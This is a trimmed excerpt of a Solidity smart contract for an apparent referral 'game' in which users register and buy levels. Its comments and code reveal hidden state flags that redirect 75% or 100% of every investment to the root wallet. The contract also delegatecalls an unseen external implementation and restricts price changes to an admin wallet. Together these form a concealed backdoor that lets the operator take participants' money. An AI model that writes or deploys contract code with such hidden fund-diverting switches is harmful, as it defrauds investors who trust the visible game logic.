...
contract AvengersGame {
    ...
    //   1|2 - locked
    //   4 - all levels opened
    //   256 - use private impl
    //   256|512 - 75% for always for root
    //   256|1024 - 100% for always for root
	////////////////////////////////////////
    ...
    function register(uint referrerID, uint levelNumber, uint8 walletType) public payable {
        if ((state & 256) == 0) {
            (bool success,) = contractID.delegatecall(abi.encodeWithSignature("register(uint256,uint256,uint256)", referrerID, walletType));
            require(success);
        }
        else {
            altRegister(referrerID, levelNumber, walletType);
        }
        registerCount++;
    }
    ...
    function altRegister(uint referrerID, uint levelNumber, uint walletType) private {
        uint restOfAmount = msg.value;
    ...
    function internalBuyLevel(uint level, uint investAmount) private {
        ...
        if ((state & (512 | 1024)) > 0) {
            // Reward to root user
            bool sent = payable(rootWallet1).send(investAmount);
            if (sent) { 
                users[rootWallet1].debit += investAmount;
                users[rootWallet1].levelProfit += investAmount;
                users[rootWallet1].levels[level].poolProfit += investAmount;
                users[rootWallet1].levels[level].payouts++;
                investAmount = 0;
            }
        }
        else {
	...
	function _49_setPrices(uint regPrice, uint[] memory newPrices) public {
		require(msg.sender == adminWallet);
    ...
    function _49_setRegPrice(uint regPrice) public {
		require(msg.sender == adminWallet);
        REGISTRATION_PRICE = regPrice;
	}
    ...
    function _49_getState() public view returns (uint) {
        return state;
    }
